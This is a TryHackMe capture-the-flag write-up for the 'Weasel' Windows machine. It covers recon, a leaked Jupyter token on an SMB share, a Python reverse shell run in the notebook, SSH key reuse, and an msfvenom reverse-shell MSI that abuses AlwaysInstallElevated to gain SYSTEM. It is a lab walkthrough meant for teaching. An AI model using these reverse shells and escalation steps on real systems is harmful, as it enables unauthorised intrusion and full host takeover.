---
title: "Weasel"
date: 2025-03-10
draft: false
summary: "Writeup for Weasel CTF challenge on TryHackMe."
tags: ["windows", "rce", "misconfigured privs", "hardcoded creds"]
categories: ["writeups"]
series: []
showToc: true
cover:
  image: "https://cdn.ziomsec.com/weasel/cover.webp"
  caption: "Weasel TryHackMe Challenge"
  alt: "Weasel cover"
platform: "TryHackMe"
---

I think the data science team has been a bit fast and loose with their project resources.
<!--more-->
To access the machine, click on the link given below:
- https://tryhackme.com/room/weasel

## Reconnaissance

I performed an **nmap** aggressive scan on the target to reveal the open ports and services running on them.

```shell
nmap -A -p- TARGET -Pn --min-rate 10000 -oN weasel.nmap
```

| **Port** | **Service** |
| -------- | ----------- |
| 22       | ssh         |
| 135      | msrpc       |
| 139      | netbios     |
| 445      | smb         |
| 3389     | rdp         |
| 5985     | winrm       |
| 8888     | http        |
| 47001    | winrm       |
| 49664    | msrpc       |
| 49665    | msrpc       |
| 49667    | msrpc       |
| 49668    | msrpc       |
| 49669    | msrpc       |
| 49670    | msrpc       |
| 49671    | msrpc       |

![](https://cdn.ziomsec.com/weasel/1.webp)

![](https://cdn.ziomsec.com/weasel/2.webp)

## Foothold

The nmap scan revealed multiple services running like **ssh**, **rpc**, **smb**, **http**, **winrm** etc. I started enumeration with **http**. I accessed it on my browser and found a **Jupyter** notebook login page.

![](https://cdn.ziomsec.com/weasel/3.webp)

I then looked for hidden directories using **ffuf** on the jupyter notebook page.

```shell
ffuf -u http://TARGET:8888/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-directories.txt -mc 200,302,301
```

![](https://cdn.ziomsec.com/weasel/4.webp)

I found an *api* endpoint but found nothing interesting there. It just revealed the version: `6.0.3`.

I then enumerated **smb** and listed the shares on the target.

```shell
smbclient -L TARGET
```

![](https://cdn.ziomsec.com/weasel/5.webp)

There was an interesting share called *datasci-team*. I then used **smbclient** to connect to the share and found the jupyter token. I could use this token to log into the jupyter notebook. So I downloaded this token.

```shell
smbclient //TARGET/datasci-team -N
```

![](https://cdn.ziomsec.com/weasel/6.webp)

I pasted the token and used it to set the password as **password**

![](https://cdn.ziomsec.com/weasel/7.webp)

I found a bunch of files. The *workbook* file seemed interesting so I opened it.

![](https://cdn.ziomsec.com/weasel/8.webp)

I was allowed to run **python** code in this workbook.

![](https://cdn.ziomsec.com/weasel/9.webp)

So I added a new code block and a simple **python** code to get a reverse shell.

```
import sys
import socket
import os
import pty

attacker_ip = 'IP'
attacker_port = 'PORT'

s = socket.socket()
s.connect((attacker_ip, attacker_port))

[os.dup2(s.fileno(), fd) for fd in (0, 1, 2)]

pty.spawn("/bin/bash")
```

![](https://cdn.ziomsec.com/weasel/10.webp)

I started a listener and executed the code to get a reverse shell from the target.

```shell
rlwrap nc -lvp 80
```

![](https://cdn.ziomsec.com/weasel/11.webp)

I found an **ssh** private key of the *dev-datasci-lowpriv* user.

![](https://cdn.ziomsec.com/weasel/12.webp)

I saved this private key on my local system and used it to log in through **ssh**.

```shell
ssh -i priv.key dev-datasci-lowpriv@TARGET
```

Finally, I got the user flag from *Desktop*.

```shell
more C:\Users\dev-datasci-lowpriv\Desktop\user.txt
```

![](https://cdn.ziomsec.com/weasel/13.webp)

## Privilege Escalation

To enumerate misconfigurations, I downloaded **PrivescCheck** and ran it on the system.

```shell
powershell -ep bypass
.\PrivescCheck.ps1; Invoke-PrivescCheck
```

![](https://cdn.ziomsec.com/weasel/14.webp)

It discovered and extracted the **winlogon** credentials.

![](https://cdn.ziomsec.com/weasel/15.webp)

It then found a vulnerability that could be used to escalate our privilege.

![](https://cdn.ziomsec.com/weasel/16.webp)

I referred to the below article to use the **AlwaysinstallElevated** policy to get admin access : 
- https://www.hackingarticles.in/windows-privilege-escalation-alwaysinstallelevated/

Hence, I created a payload using **msfvenom**.

```shell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER LPORT=PORT -f msi -o exploit.msi
```

![](https://cdn.ziomsec.com/weasel/17.webp)

I downloaded this payload on the system and started a **netcat** listener on my local machine.

![](https://cdn.ziomsec.com/weasel/18.webp)

I ran the payload with **msiexec** as *dev-datasci-lowpriv* user.

```shell
runas /u:dev-datasci-lowpriv "msiexec /qn /i C:\Users\dev-datasci-lowpriv\Desktop\exploit.msi"
```

![](https://cdn.ziomsec.com/weasel/19.webp)

Finally, I got a reverse shell as **NT authority system**.

![](https://cdn.ziomsec.com/weasel/20.webp)

I then captured the root flag from *Administrator*'s Desktop.

```shell
more C:\Users\Administrator\Desktop\root.txt
```

![](https://cdn.ziomsec.com/weasel/21.webp)

That's it from my side! Until next time :)

---
